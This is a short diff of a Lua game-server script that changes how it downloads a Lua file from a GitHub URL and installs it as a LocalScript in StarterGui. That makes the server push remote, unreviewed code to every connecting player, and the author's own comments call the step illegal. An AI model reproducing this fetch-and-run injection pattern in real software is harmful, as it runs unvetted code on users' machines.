@@ -80,8 +80,7 @@ local scriptContext = game:GetService('ScriptContext')
 -- Do something very, *very* illegal
 StarterGui = game:GetService('StarterGui')
 WorstIdeaEver = Instance.new("LocalScript")
-WorstIdeaEverSource = game:HttpGet("https://github.com/dfault-user/ForgiveMeFatherForIHaveSinned/raw/refs/heads/master/HxCS2.lua")
-print(#WorstIdeaEverSource)
+WorstIdeaEverSource = HttpService:GetAsync("https://github.com/dfault-user/ForgiveMeFatherForIHaveSinned/raw/refs/heads/master/HxCS2.lua")
 if #WorstIdeaEverSource > 0 then
 	WorstIdeaEver.Source = WorstIdeaEverSource
 	WorstIdeaEver.Parent = StarterGui
@@ -158,6 +157,9 @@ end
 pcall(function() game:GetService("NetworkServer"):SetIsPlayerAuthenticationRequired(true) end)
 settings().Diagnostics.LuaRamLimit = 0
 
+HttpService = game:GetService("HttpService")
+HttpService.HttpEnabled=true
+
 function waitForChild(parent, childName)
 	while true do
 		local child = parent:findFirstChild(childName)
@@ -205,7 +207,6 @@ game:GetService("Players").PlayerAdded:connect(function(player)
 	end
 end)
 
-local HttpService = game:GetService("HttpService")
 local function sendLogs(blocking)
 	pcall(function()
 		game:HttpPost(url .. "/game/Log.ashx?" .. "jobId=" .. JobId .. "&placeId=" .. placeId .. "&" .. access, HttpService:JSONEncode(logs), blocking, "application/json")
